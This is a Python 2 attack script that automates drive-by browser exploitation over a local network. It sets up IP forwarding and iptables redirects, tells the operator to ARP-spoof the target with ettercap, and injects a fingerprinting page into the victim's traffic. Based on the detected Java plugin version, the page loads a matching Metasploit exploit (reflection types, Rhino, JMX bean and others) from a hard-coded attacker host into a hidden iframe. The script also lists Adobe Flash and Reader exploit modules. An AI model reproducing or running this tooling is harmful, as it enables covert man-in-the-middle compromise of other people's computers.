from threading import Thread
from SocketServer import ThreadingMixIn
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
import string,cgi,time,urlparse,commands,os,subprocess
from os import curdir, sep
import sys

javaSelfsigned=False
msfPath="/pentest/metasploit-framework"
'''
use exploit/windows/browser/adobe_cooltype_sing
use exploit/windows/browser/adobe_flash_avm2
use exploit/windows/browser/adobe_flash_filters_type_confusion
use exploit/windows/browser/adobe_flash_mp4_cprt
use exploit/windows/browser/adobe_flash_otf_font
use exploit/windows/browser/adobe_flash_pixel_bender_bof
use exploit/windows/browser/adobe_flash_regex_value
use exploit/windows/browser/adobe_flash_rtmp
use exploit/windows/browser/adobe_flash_sps
use exploit/windows/browser/adobe_flashplayer_arrayindexing
use exploit/windows/browser/adobe_flashplayer_avm
use exploit/windows/browser/adobe_flashplayer_flash10o
use exploit/windows/browser/adobe_flashplayer_newfunction
use exploit/windows/browser/adobe_flatedecode_predictor02
use exploit/windows/browser/adobe_geticon
use exploit/windows/browser/adobe_jbig2decode
use exploit/windows/browser/adobe_media_newplayer
use exploit/windows/browser/adobe_shockwave_rcsl_corruption
use exploit/windows/browser/adobe_toolbutton
use exploit/windows/browser/adobe_utilprintf
'''

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if 'fingerprint.html' in self.path:
                f = open(curdir + sep + self.path, 'rb')
		self.send_response(200)
                self.send_header('Content-type',    'text/html')
                self.end_headers()
                self.wfile.write(f.read())
                f.close()
                return		
        else:
            parsed_path = urlparse.urlparse(self.path)
            message_parts = [
                    'client_address=%s (%s)' % (self.client_address,
                                                self.address_string()),
                    'query=%s' % parsed_path.query,
                    ]
            for name, value in sorted(self.headers.items()):
                message_parts.append('%s=%s' % (name, value.rstrip()))
            message_parts.append('')
            message = '\r\n'.join(message_parts)
            self.send_response(200)
            self.end_headers()
            for msg in message_parts:
                if 'client_address' in msg:
                    print "Target: "+msg.split(") (")[1].strip(")")
                if 'query' in msg:
                    pluginVer = msg.replace("query=","").split('&')
		    for i in pluginVer:
			if i:
				pdtName,pdtVer = i.split("=")
				pdtVer = pdtVer.replace(",",".")
				print pdtName+'\t'+pdtVer
            return

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""     

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

def getIP(iface):
    cmd = "ifconfig "+iface+" | grep 'inet ' | awk '{print $2}' | cut -d':' -f 2"
    ipAddr = commands.getstatusoutput(cmd)[1]
    return ipAddr

def modifyHTML(filename):
    content = []
    
    ipAddr = getIP('eth0')
    with open(filename) as f:
    	for line in f:
		if '$.get(' in line:
			replaceLine = "		$.get('http://"+ipAddr+":9090/scan?'+ params, function(data) {\n"
			content.append(replaceLine)
		elif line.strip()=="//plugins":
			content.append(line)
			content.append("var iframe = document.getElementById('exploit');\n")
			content.append("var iframesigned = document.getElementById('signed');\n")

			content.append("plugin=plugins[ao[i]];\n")
			content.append("verSplit=BrowserScanHostDetails[ao[i]].split(',');\n")
			content.append("verMaj = verSplit[0]+','+verSplit[1]+','+verSplit[2];\n")
			content.append("verMin = verSplit[3];\n")
			#content.append("if(plugin=='java'){alert(verMaj+'\t'+verMin);}\n")
			#content.append("alert(verMaj);\n")
			#content.append("alert(verMin);\n")

			content.append("url = 'http://172.16.91.187:8085/java_jre17_reflection_types';\n")
			content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

			content.append("url = 'http://172.16.91.187:8084/java_jre17_provider_skeleton';\n")
			content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>-1 && verMin<12){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

			content.append("url = 'http://172.16.91.187:8082/java_jre17_jmxbean_2';\n")
			content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<12){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

			content.append("url = 'http://172.16.91.187:8086/java_rhino';\n")
			content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>0 && verMin<28){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

			content.append("url = 'http://172.16.91.187:8083/java_jre17_method_handle';\n")
			content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<8){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
			content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
			content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>3 && verMin<28){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

			content.append("url = 'http://172.16.91.187:8092/java_verifier_field_access';\n")
			content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin==32){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
			content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin==4){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
			content.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin==35){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

			content.append("url = 'http://172.16.91.187:8091/java_trusted_chain';\n")
			content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>0 && verMin<19){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
			content.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin>0 && verMin<24){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
			content.append("if(plugin=='java' && verMaj=='1,4,2'){if(verMin>0 && verMin<10){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

			content.append("url = 'http://172.16.91.187:8090/java_storeimagearray';\n")
			content.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin>35 && verMin<46){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
			content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>21 && verMin<46){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
			content.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

			content.append("url = 'http://172.16.91.187:8088/java_setdifficm_bof';\n")
			content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>0 && verMin<17){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
			content.append("if(plugin=='java' && verMaj=='1,5,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
			content.append("if(plugin=='java' && verMaj=='1,4,0'){if(verMin>0 && verMin<25){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
			
			content.append("url = 'http://172.16.91.187:8087/java_rmi_connection_impl';\n")
			content.append("if(plugin=='java' && verMaj=='1,6,0'){if(verMin>-1 && verMin<19){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")

			#If all else fails, let's use the java signed applet
			if(javaSelfsigned==True):	
				content.append("url = 'http://172.16.91.187:8089/java_signed_applet';\n")
				content.append("if(plugin=='java'){{iframesigned.setAttribute('src',url);iframesigned.contentDocument.location.reload(true);}};\n")

		else:
			content.append(line)
    fo = open("fingerprint.html", "w+") 
    fo.writelines(content)
    fo.close()
def setupForwarding():
	print "[*] Setup forwarding"
	cmd = "sysctl -w net.ipv4.ip_forward=1"
	subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
	cmd = "echo '1' > /proc/sys/net/ipv4/ip_forward"
	subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
	cmd = "iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080"
	subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
	cmd = "iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080"

def startMITMproxy():
	setupForwarding()
	#cmd = 'screen -list | grep msfconsole'
	#result = commands.getstatusoutput(cmd)[1]
	#if 'msfconsole' not in result:
	#	cmd = 'screen -dmS msfconsole'
	#	subprocess.Popen(cmd, shell=True)
	#time.sleep(2)
	#cmdStr = '/bin/bash --login'
	#cmd = 'screen -S msfconsole -X stuff "'+cmdStr+'^m"'
	#subprocess.Popen(cmd, shell=True)
	
	#time.sleep(2)
	#cmdStr = 'rvm use 1.9.3-p484'
	#cmd = 'screen -S msfconsole -X stuff "'+cmdStr+'^m"'
	#subprocess.Popen(cmd, shell=True)

	cmdStr = 'cd '+msfPath
	print cmdStr
	#cmd = 'screen -S msfconsole -X stuff "'+cmdStr+'^m"'
	#subprocess.Popen(cmd, shell=True)

	cmdStr = './msfconsole -r '+os.getcwd()+'/msfrun.rc'
	print cmdStr
	#cmd = 'screen -S msfconsole -X stuff "'+cmdStr+'^m"'
	#subprocess.Popen(cmd, shell=True)

	#time.sleep(5)
	#cmdStr = 'resource '+os.getcwd()+'/msfrun.rc'
	#print cmdStr
	#cmd = 'screen -S msfconsole -X stuff "'+cmdStr+'^m"'
	#subprocess.Popen(cmd, shell=True)
	
	cmd = 'screen -list | grep mitm'
	result = commands.getstatusoutput(cmd)[1]
	if 'mitm' not in result:
		cmd = 'screen -dmS mitm'
		subprocess.Popen(cmd, shell=True)
	cmdStr = 'cd '+os.getcwd()
	#print cmdStr
	cmd = 'screen -S mitm -X stuff "'+cmdStr+'^m"'
	subprocess.Popen(cmd, shell=True)
        ipAddr = getIP('eth0')
	cmdStr = 'python iframe_injector http://'+ipAddr+':9090/fingerprint.html'
	cmd = 'screen -S mitm -X stuff "'+cmdStr+'^m"'
	#print cmdStr
	subprocess.Popen(cmd, shell=True)
	print 
	#cmd = 'screen  -S hello  -X stuff "ping 4.2.2.2^m"

def setupMetasploit():
	ipAddr = getIP()
	#"use exploit/multi/browser/java_signed_applet"
	#"set SRVHOST "+ipAddr
	#"set SRVPORT 8081"
	#"set URIPATH /java"

def main():
    try:
	#Get Gateway
	cmd = "route -n | awk '$2 ~/[1-9]+/ {print $2;}'"
	gatewayIPList = commands.getstatusoutput(cmd)[1]
	gatewayIP = gatewayIPList.split("\n")[0]
        server = ThreadedHTTPServer(('', 9090), Handler)
        print 'Started httpserver...'
	startMITMproxy()
	modifyHTML('fingerprint_template.html')
	print "[*] Run the below command in another terminal"
	print bcolors.OKGREEN+"ettercap -T -q -M ARP /targetIP/  /"+gatewayIP+"/"+bcolors.ENDC
        server.serve_forever()
    except KeyboardInterrupt:
        print '^C received, shutting down server'
	cmd = "killall screen"
	#subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
        server.socket.close()

if __name__ == '__main__':
    main()
